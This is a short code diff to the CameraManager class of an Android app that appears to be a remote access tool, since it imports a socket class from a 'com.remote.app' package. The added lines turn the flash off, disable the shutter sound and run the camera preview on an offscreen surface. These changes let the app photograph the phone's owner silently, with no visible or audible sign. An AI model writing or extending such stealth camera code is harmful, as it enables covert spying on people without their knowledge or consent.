@@ -9,6 +9,9 @@ import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.hardware.Camera.PictureCallback;
 import android.hardware.Camera.Parameters;
+import android.os.Build;
+
+import com.remote.app.socket.IOSocket;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -31,8 +34,12 @@ public class CameraManager {
     public void startUp(int cameraID) {
         camera = Camera.open(cameraID);
         Parameters parameters = camera.getParameters();
+        parameters.setFlashMode("off");
         camera.setParameters(parameters);
         try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+                camera.enableShutterSound(false);
+            }
             camera.setPreviewTexture(new SurfaceTexture(0));
             camera.startPreview();
         } catch (Exception e) {
